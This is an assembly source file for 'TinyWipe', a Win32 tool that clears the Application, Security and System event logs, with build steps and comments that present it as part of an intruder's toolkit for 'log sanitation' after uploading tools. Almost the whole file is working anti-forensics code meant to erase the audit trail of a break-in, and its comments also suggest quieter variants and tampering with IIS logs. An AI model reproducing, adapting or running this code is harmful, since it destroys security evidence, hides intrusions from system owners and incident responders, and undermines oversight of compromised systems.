;                          -=[   TinyWipe   ]=-
;                          -=[      by      ]=-
;                          -=[   Red SkÃ¤l   ]=-

; TinyWipe is just a reaction of the sparse Win32 log wipers.  I had looked for
; ages and couldn't find one when I needed one.  Soon after I found several.  All
; of which were programmed in C.  And although this program was written more as
; an exercise in win32asm for me, I thought there were benefits to having this
; done in asm:
;      1) The .EXE will be smaller, effectively cutting down the size of your
;         bundle of 'hax0r' tools.
;      2) And the less time spent on uploads and the more on log sanitation the
;         better.

; The log names are hardcoded and it will loop to clear them all.  So you'll have
; to change that yourself if you want to be more discreet.  I may update this in
; the future and make it so you can choose the specific log files.  And maybe
; overwrite parts of the IIS logs?

; To assemble:
;    C:\nasm> nasmw -fwin32 tinywipe.asm
;    C:\nasm> alink tinywipe.obj win32.lib -entry _start -subsys win -oPE
; After this you need to enable the Write bit in the
; header of the code section.  I personally use LordPE
; so I can use the "Rebuild PE" function at the same
; time.

      [bits 32]
      [extern LoadLibraryA]
      [extern GetProcAddress]
      [section fuck_you code use32]
      [global _start]

; read as...
; ReadEventLog(hLog,EVENTLOG_FORWARDS_READ|EVENTLOG_SEQUENTIAL_READ,0,evtlogrec,sizeof(buff),(int)read,(int)needed);

_start:
       ;lea ebx, [szDLL]
       push szDLL
       call LoadLibraryA
       mov [hAdvapi32], eax
       
       ;lea ebx, [szOEL]
       push szOEL
       push eax                        ; eax = advapi32.dll handle
       call GetProcAddress
       mov dword [OpenEventLog], eax

       ;lea ebx, [szClEL]
       push szClEL
       ;lea ebx, [hEvtLog]
       push dword [hAdvapi32]
       call GetProcAddress
       mov dword [ClearEventLog], eax

       ;lea ebx, [szCEL]
       push szCEL
       ;lea ebx, [hEvtLog]
       push dword [hAdvapi32]
       call GetProcAddress
       mov dword [CloseEventLog], eax

       cld
       mov esi, dword pNames
       jmp .main_loop
       db 'R.I.P Steve Irwin - A True Legend',0
 .main_loop:
       lodsd
       cmp dword eax, 0
       je .exit
       
 .open_log:
       push eax
       push 0
       call dword [OpenEventLog]
       mov dword [hFile], eax

 .clear_log:
       push 0
       push eax
       ;push 0
       call dword [ClearEventLog]
 
 .close_log:
       push dword [hFile]
       call dword [CloseEventLog]
       jmp .main_loop
 
 .exit:
       ret
data:
       szApp      db           "Application",0
       szSec      db           "Security",0
       szSys      db           "System",0
       pNames     dd           szApp
                  dd           szSec
                  dd           szSys
                  dd           0
       szDLL      db           "advapi32.dll",0
       szOEL      db           "OpenEventLogA",0
       szClEL     db           "ClearEventLogA",0
       szCEL      db           "CloseEventLog",0
       hAdvapi32       dd      0
       OpenEventLog    dd      0
       ClearEventLog   dd      0
       CloseEventLog   dd      0
       hFile           dd      0
end: